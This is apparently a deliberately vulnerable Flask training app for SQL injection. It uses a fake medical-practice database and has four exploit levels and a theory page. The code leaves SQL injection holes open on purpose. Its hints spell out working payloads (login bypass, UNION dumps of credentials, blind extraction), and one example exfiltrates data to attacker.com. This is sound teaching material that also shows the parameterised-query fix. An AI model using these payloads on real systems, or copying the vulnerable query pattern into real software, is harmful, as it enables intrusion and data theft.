#!/usr/bin/env python3
"""
Medical Practice SQLi Lab
Deliberately vulnerable Flask app for learning SQL injection.
DO NOT deploy this in production. Ever.
"""
import sqlite3
import os
from flask import Flask, request, render_template_string

app = Flask(__name__)
DB_PATH = os.path.join(os.path.dirname(__file__), 'medical.db')

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.executescript('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            role TEXT DEFAULT 'user'
        );
        CREATE TABLE IF NOT EXISTS patient (
            patient_id INTEGER PRIMARY KEY AUTOINCREMENT,
            first_name TEXT NOT NULL,
            last_name TEXT NOT NULL,
            date_of_birth TEXT NOT NULL,
            gender TEXT,
            mobile_phone TEXT
        );
        CREATE TABLE IF NOT EXISTS practitioner (
            practitioner_id INTEGER PRIMARY KEY AUTOINCREMENT,
            first_name TEXT NOT NULL,
            last_name TEXT NOT NULL,
            practitioner_type TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS appointment (
            appointment_id INTEGER PRIMARY KEY AUTOINCREMENT,
            patient_id INTEGER NOT NULL,
            practitioner_id INTEGER NOT NULL,
            appointment_date TEXT NOT NULL,
            appointment_time TEXT NOT NULL,
            notes TEXT
        );
        CREATE TABLE IF NOT EXISTS secrets (
            id INTEGER PRIMARY KEY,
            flag TEXT NOT NULL,
            description TEXT
        );
    ''')
    # Insert data if empty
    if not c.execute("SELECT COUNT(*) FROM users").fetchone()[0]:
        c.executescript('''
            INSERT INTO users VALUES (1, 'admin', 'Sup3rS3cr3t!', 'admin');
            INSERT INTO users VALUES (2, 'nurse_joy', 'pokemon123', 'nurse');
            INSERT INTO users VALUES (3, 'dr_house', 'vicodin4life', 'doctor');
            INSERT INTO users VALUES (4, 'receptionist', 'welcome1', 'user');

            INSERT INTO patient VALUES (1, 'George', 'Wu', '1996-07-15', 'M', '0412345678');
            INSERT INTO patient VALUES (2, 'Lex', 'Luther', '1994-07-24', 'F', '0466666666');
            INSERT INTO patient VALUES (3, 'James', 'Chen', '1960-07-17', 'M', '0499333555');
            INSERT INTO patient VALUES (4, 'Sandra', 'Williams', '1975-03-22', 'F', '0498765432');
            INSERT INTO patient VALUES (5, 'Bruce', 'Wayne', '1985-02-19', 'M', '0400BATMAN');

            INSERT INTO practitioner VALUES (1, 'Mr', 'Bean', 'GP');
            INSERT INTO practitioner VALUES (2, 'Eric', 'Cartman', 'Psychiatrist');
            INSERT INTO practitioner VALUES (3, 'Leopold', 'Stotch', 'Psychologist');
            INSERT INTO practitioner VALUES (4, 'Amy', 'Nguyen', 'Optometrist');

            INSERT INTO appointment VALUES (1, 1, 1, '2026-02-02', '09:30', 'Foreign object lodged in crevice');
            INSERT INTO appointment VALUES (2, 2, 2, '2026-02-11', '15:30', 'Anger Management');
            INSERT INTO appointment VALUES (3, 4, 1, '2026-03-01', '14:10', 'Routine Checkup');
            INSERT INTO appointment VALUES (4, 4, 3, '2026-02-07', '10:15', 'Follow-up session');
            INSERT INTO appointment VALUES (5, 5, 2, '2026-02-14', '11:00', 'Nocturnal activities causing fatigue');

            INSERT INTO secrets VALUES (1, 'FLAG{sql_injection_is_not_a_feature}', 'You found the flag!');
            INSERT INTO secrets VALUES (2, 'FLAG{the_machine_spirit_endures}', 'Omnissiah approved.');
        ''')
    conn.commit()
    conn.close()

# === HTML TEMPLATES ===

LAYOUT = '''
<!DOCTYPE html>
<html>
<head>
    <title>Medical Practice Portal</title>
    <style>
        body { font-family: monospace; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; }
        h1 { color: #e94560; }
        h2 { color: #0f3460; background: #e94560; padding: 8px; display: inline-block; }
        a { color: #e94560; }
        input, textarea { background: #16213e; color: #eee; border: 1px solid #e94560; padding: 8px; margin: 4px 0; font-family: monospace; }
        button { background: #e94560; color: #fff; border: none; padding: 10px 20px; cursor: pointer; font-family: monospace; font-weight: bold; }
        button:hover { background: #c81e45; }
        table { border-collapse: collapse; width: 100%; margin: 10px 0; }
        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
        th { background: #e94560; }
        .vuln { background: #16213e; padding: 15px; margin: 15px 0; border-left: 4px solid #e94560; }
        .hint { background: #0f3460; padding: 10px; margin: 5px 0; font-size: 0.9em; color: #aaa; }
        .error { color: #ff6b6b; background: #2d1b1b; padding: 10px; margin: 5px 0; }
        .success { color: #6bff6b; background: #1b2d1b; padding: 10px; margin: 5px 0; }
        .nav { background: #16213e; padding: 10px; margin-bottom: 20px; }
        .nav a { margin-right: 15px; text-decoration: none; }
        pre { background: #0a0a1a; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
<div class="container">
    <h1>Medical Practice Portal</h1>
    <div class="nav">
        <a href="/">Home</a>
        <a href="/login">Level 1: Login Bypass</a>
        <a href="/search">Level 2: Data Extraction</a>
        <a href="/union">Level 3: UNION Attack</a>
        <a href="/blind">Level 4: Blind SQLi</a>
        <a href="/theory">Theory</a>
    </div>
    {{ content | safe }}
</div>
</body>
</html>
'''

HOME_PAGE = '''
<h2>SQLi Training Lab</h2>
<p>This app is <strong>deliberately vulnerable</strong>. Your mission: exploit each level.</p>
<div class="vuln">
    <h3>Levels:</h3>
    <ol>
        <li><a href="/login">Login Bypass</a> — Classic auth bypass with ' OR 1=1 --</li>
        <li><a href="/search">Data Extraction</a> — Extract patient data through search</li>
        <li><a href="/union">UNION Attack</a> — Read other tables using UNION SELECT</li>
        <li><a href="/blind">Blind SQLi</a> — Extract data when you can't see the output</li>
    </ol>
</div>
<div class="vuln">
    <h3>Database Schema:</h3>
    <pre>
Tables: users, patient, practitioner, appointment, secrets

users: id, username, password, role
patient: patient_id, first_name, last_name, date_of_birth, gender, mobile_phone
practitioner: practitioner_id, first_name, last_name, practitioner_type
appointment: appointment_id, patient_id, practitioner_id, appointment_date, appointment_time, notes
secrets: id, flag, description
    </pre>
</div>
<div class="hint">
    Target: Find the flags in the secrets table. There are 2.
</div>
'''

# === LEVEL 1: LOGIN BYPASS ===
@app.route('/login', methods=['GET', 'POST'])
def login():
    result = ''
    query_shown = ''
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        # VULNERABLE: String concatenation in SQL query
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        query_shown = query

        try:
            conn = get_db()
            user = conn.execute(query).fetchone()
            conn.close()
            if user:
                result = f'<div class="success">Welcome, {user["username"]}! Role: {user["role"]}</div>'
                if user["role"] == "admin":
                    result += '<div class="success">ADMIN ACCESS GRANTED. You bypassed authentication.</div>'
            else:
                result = '<div class="error">Invalid credentials.</div>'
        except Exception as e:
            result = f'<div class="error">SQL Error: {e}</div>'

    content = f'''
    <h2>Level 1: Login Bypass</h2>
    <div class="vuln">
        <p>The login form uses string concatenation to build SQL queries. No parameterised queries. No input sanitisation.</p>
        <form method="POST">
            <label>Username:</label><br>
            <input type="text" name="username" size="40" value=""><br>
            <label>Password:</label><br>
            <input type="text" name="password" size="40" value=""><br><br>
            <button type="submit">Login</button>
        </form>
        {result}
        {f'<div class="hint"><strong>Query executed:</strong><pre>{query_shown}</pre></div>' if query_shown else ''}
    </div>
    <div class="hint">
        <strong>Theory:</strong> The query is: SELECT * FROM users WHERE username = '<em>INPUT</em>' AND password = '<em>INPUT</em>'<br>
        What happens if you close the quote early and add your own SQL logic?<br><br>
        <strong>Try:</strong> Username: <code>' OR 1=1 --</code> Password: <code>anything</code><br>
        <strong>Why:</strong> The query becomes: SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'<br>
        The <code>--</code> comments out the rest. <code>OR 1=1</code> is always true. You get the first user (admin).
    </div>
    '''
    return render_template_string(LAYOUT, content=content)


# === LEVEL 2: DATA EXTRACTION ===
@app.route('/search', methods=['GET', 'POST'])
def search():
    result = ''
    query_shown = ''
    if request.method == 'POST':
        name = request.form.get('name', '')

        # VULNERABLE: Direct string interpolation
        query = f"SELECT * FROM patient WHERE first_name LIKE '%{name}%' OR last_name LIKE '%{name}%'"
        query_shown = query

        try:
            conn = get_db()
            rows = conn.execute(query).fetchall()
            conn.close()
            if rows:
                result = '<table><tr><th>ID</th><th>First</th><th>Last</th><th>DOB</th><th>Gender</th><th>Phone</th></tr>'
                for r in rows:
                    result += f'<tr><td>{r["patient_id"]}</td><td>{r["first_name"]}</td><td>{r["last_name"]}</td><td>{r["date_of_birth"]}</td><td>{r["gender"]}</td><td>{r["mobile_phone"]}</td></tr>'
                result += '</table>'
            else:
                result = '<div class="error">No patients found.</div>'
        except Exception as e:
            result = f'<div class="error">SQL Error: {e}</div>'

    content = f'''
    <h2>Level 2: Data Extraction</h2>
    <div class="vuln">
        <p>Search for patients by name. The search uses LIKE with direct string interpolation.</p>
        <form method="POST">
            <label>Patient Name:</label><br>
            <input type="text" name="name" size="40" value=""><br><br>
            <button type="submit">Search</button>
        </form>
        {result}
        {f'<div class="hint"><strong>Query executed:</strong><pre>{query_shown}</pre></div>' if query_shown else ''}
    </div>
    <div class="hint">
        <strong>Try:</strong> <code>' OR 1=1 --</code> to dump all patients<br>
        <strong>Next:</strong> Use <code>' UNION SELECT 1,username,password,role,'x','x' FROM users --</code> to read the users table<br>
        <strong>Why:</strong> UNION lets you append results from a different query. Column count must match (6 columns).
    </div>
    '''
    return render_template_string(LAYOUT, content=content)


# === LEVEL 3: UNION ATTACK ===
@app.route('/union', methods=['GET', 'POST'])
def union():
    result = ''
    query_shown = ''
    if request.method == 'POST':
        patient_id = request.form.get('id', '')

        # VULNERABLE: No type checking, direct interpolation
        query = f"SELECT appointment_id, appointment_date, appointment_time, notes FROM appointment WHERE patient_id = {patient_id}"
        query_shown = query

        try:
            conn = get_db()
            rows = conn.execute(query).fetchall()
            conn.close()
            if rows:
                result = '<table><tr><th>Appt ID</th><th>Date</th><th>Time</th><th>Notes</th></tr>'
                for r in rows:
                    result += f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td></tr>'
                result += '</table>'
            else:
                result = '<div class="error">No appointments found.</div>'
        except Exception as e:
            result = f'<div class="error">SQL Error: {e}</div>'

    content = f'''
    <h2>Level 3: UNION Attack</h2>
    <div class="vuln">
        <p>Look up appointments by patient ID. The input is an integer — but it's not validated.</p>
        <form method="POST">
            <label>Patient ID:</label><br>
            <input type="text" name="id" size="40" value=""><br><br>
            <button type="submit">Look Up</button>
        </form>
        {result}
        {f'<div class="hint"><strong>Query executed:</strong><pre>{query_shown}</pre></div>' if query_shown else ''}
    </div>
    <div class="hint">
        <strong>Step 1:</strong> Find column count: <code>1 ORDER BY 4 --</code> (works) vs <code>1 ORDER BY 5 --</code> (fails) = 4 columns<br>
        <strong>Step 2:</strong> Extract table names: <code>0 UNION SELECT 1,name,type,sql FROM sqlite_master --</code><br>
        <strong>Step 3:</strong> Read secrets: <code>0 UNION SELECT id,flag,description,'x' FROM secrets --</code><br>
        <strong>Step 4:</strong> Read users: <code>0 UNION SELECT id,username,password,role FROM users --</code>
    </div>
    '''
    return render_template_string(LAYOUT, content=content)


# === LEVEL 4: BLIND SQLi ===
@app.route('/blind', methods=['GET', 'POST'])
def blind():
    result = ''
    query_shown = ''
    if request.method == 'POST':
        patient_id = request.form.get('id', '')

        # VULNERABLE: Boolean-based blind injection
        query = f"SELECT first_name FROM patient WHERE patient_id = {patient_id}"
        query_shown = query

        try:
            conn = get_db()
            row = conn.execute(query).fetchone()
            conn.close()
            if row:
                result = '<div class="success">Patient exists.</div>'
            else:
                result = '<div class="error">Patient not found.</div>'
        except Exception as e:
            result = f'<div class="error">SQL Error: {e}</div>'

    content = f'''
    <h2>Level 4: Blind SQL Injection</h2>
    <div class="vuln">
        <p>Check if a patient exists. The app only tells you YES or NO — no data is displayed.</p>
        <p>This is <strong>blind injection</strong>: you can't see the data directly. You ask yes/no questions and extract data one character at a time.</p>
        <form method="POST">
            <label>Patient ID:</label><br>
            <input type="text" name="id" size="60" value=""><br><br>
            <button type="submit">Check</button>
        </form>
        {result}
        {f'<div class="hint"><strong>Query executed:</strong><pre>{query_shown}</pre></div>' if query_shown else ''}
    </div>
    <div class="hint">
        <strong>Boolean-based:</strong> Ask true/false questions<br>
        <code>1 AND (SELECT length(flag) FROM secrets WHERE id=1) > 30</code> → Patient exists (true = flag > 30 chars)<br>
        <code>1 AND (SELECT length(flag) FROM secrets WHERE id=1) > 40</code> → Not found (false = flag ≤ 40 chars)<br><br>
        <strong>Extract char by char:</strong><br>
        <code>1 AND (SELECT substr(flag,1,1) FROM secrets WHERE id=1) = 'F'</code> → exists (first char is F)<br>
        <code>1 AND (SELECT substr(flag,2,1) FROM secrets WHERE id=1) = 'L'</code> → exists (second char is L)<br>
        <code>1 AND (SELECT substr(flag,3,1) FROM secrets WHERE id=1) = 'A'</code> → exists (third char is A)<br>
        ...tedious but it works when you can't see output.
    </div>
    '''
    return render_template_string(LAYOUT, content=content)


# === THEORY PAGE ===
@app.route('/theory')
def theory():
    content = '''
    <h2>SQL Injection Theory</h2>

    <div class="vuln">
        <h3>What Is SQL Injection?</h3>
        <p>SQL injection happens when user input is inserted directly into a SQL query without sanitisation.
        The attacker can modify the query's logic to bypass authentication, extract data, modify data, or even execute system commands.</p>
        <pre>
# VULNERABLE (string concatenation):
query = f"SELECT * FROM users WHERE name = '{user_input}'"

# If user_input = "' OR 1=1 --"
# Query becomes: SELECT * FROM users WHERE name = '' OR 1=1 --'
# OR 1=1 is always true → returns ALL users
# -- comments out the rest of the query</pre>
    </div>

    <div class="vuln">
        <h3>Types of SQL Injection</h3>
        <table>
            <tr><th>Type</th><th>How It Works</th><th>Example</th></tr>
            <tr><td><strong>In-band (Classic)</strong></td><td>Results are shown directly in the response</td><td>' OR 1=1 --</td></tr>
            <tr><td><strong>UNION-based</strong></td><td>Append a second query using UNION SELECT</td><td>' UNION SELECT username,password FROM users --</td></tr>
            <tr><td><strong>Error-based</strong></td><td>Force SQL errors that leak data in error messages</td><td>' AND 1=CONVERT(int,(SELECT password FROM users)) --</td></tr>
            <tr><td><strong>Blind (Boolean)</strong></td><td>Ask yes/no questions, extract data bit by bit</td><td>' AND (SELECT substr(password,1,1) FROM users)='a' --</td></tr>
            <tr><td><strong>Blind (Time)</strong></td><td>Use delays to infer true/false</td><td>' AND IF(1=1, SLEEP(5), 0) --</td></tr>
            <tr><td><strong>Out-of-band</strong></td><td>Exfiltrate data via DNS or HTTP to attacker server</td><td>'; EXEC xp_dirtree '\\\\attacker.com\\share' --</td></tr>
        </table>
    </div>

    <div class="vuln">
        <h3>The Fix: Parameterised Queries</h3>
        <pre>
# VULNERABLE:
cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")

# SECURE (parameterised):
cursor.execute("SELECT * FROM users WHERE name = ?", (name,))

# The ? placeholder tells the database: "this is DATA, not SQL code"
# The database will NEVER execute user input as SQL
# This is the #1 defence against SQL injection</pre>
    </div>

    <div class="vuln">
        <h3>The UNION Technique (Step by Step)</h3>
        <pre>
1. FIND COLUMN COUNT
   Input: 1 ORDER BY 1 --    (works)
   Input: 1 ORDER BY 2 --    (works)
   Input: 1 ORDER BY 3 --    (works)
   Input: 1 ORDER BY 4 --    (works)
   Input: 1 ORDER BY 5 --    (FAILS → 4 columns)

2. FIND WHICH COLUMNS ARE DISPLAYED
   Input: 0 UNION SELECT 'a','b','c','d' --
   (look at output to see where a,b,c,d appear)

3. ENUMERATE TABLES (SQLite)
   Input: 0 UNION SELECT 1,name,type,sql FROM sqlite_master --
   (shows all table names and their CREATE TABLE statements)

4. EXTRACT DATA
   Input: 0 UNION SELECT id,username,password,role FROM users --
   Input: 0 UNION SELECT id,flag,description,'x' FROM secrets --</pre>
    </div>

    <div class="vuln">
        <h3>Defence Layers (Defence in Depth)</h3>
        <ol>
            <li><strong>Parameterised queries</strong> — The #1 fix. Always.</li>
            <li><strong>Input validation</strong> — Reject unexpected characters (but don't rely on this alone)</li>
            <li><strong>Least privilege</strong> — DB user should only have permissions it needs</li>
            <li><strong>WAF (Web Application Firewall)</strong> — Blocks common attack patterns</li>
            <li><strong>Error handling</strong> — Never show raw SQL errors to users</li>
            <li><strong>ORM</strong> — SQLAlchemy, Django ORM etc. use parameterised queries by default</li>
        </ol>
    </div>
    '''
    return render_template_string(LAYOUT, content=content)


@app.route('/')
def index():
    return render_template_string(LAYOUT, content=HOME_PAGE)


if __name__ == '__main__':
    init_db()
    print("SQLi Lab running on http://0.0.0.0:8888")
    print("Go break it, fleshbag.")
    app.run(host='0.0.0.0', port=8888, debug=False)
